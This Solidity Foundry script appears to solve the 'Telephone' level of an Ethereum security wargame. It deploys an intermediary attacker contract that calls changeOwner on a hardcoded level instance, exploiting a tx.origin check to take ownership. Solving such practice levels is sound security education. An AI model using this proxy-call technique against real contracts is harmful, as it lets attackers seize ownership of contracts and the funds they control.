//Level Address 0x0b6F6CE4BCfB70525A31454292017F640C10c768
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "lib/forge-std/src/Script.sol";
import "src/Telephone/Telephone.sol";
import "forge-std/console2.sol";

contract TelephoneAttacker {
  address INSTANCE_LEVEL_ADDRESS = 0xaD54a3Ff049B320Ddb156E1E514b79674150477b;

  function changeOwner() external {
    Telephone telephone = Telephone(payable(INSTANCE_LEVEL_ADDRESS));
    console2.log('###Attacker Address:');
    console2.log(address(this));
    telephone.changeOwner(msg.sender);
  }
}

contract TelephoneScript is Script {
  function run() external {
    vm.startBroadcast();
    console2.log(msg.sender); //esta es mia 
    TelephoneAttacker telephoneAttacker = (new TelephoneAttacker)();
    telephoneAttacker.changeOwner();
    vm.stopBroadcast();
  }
}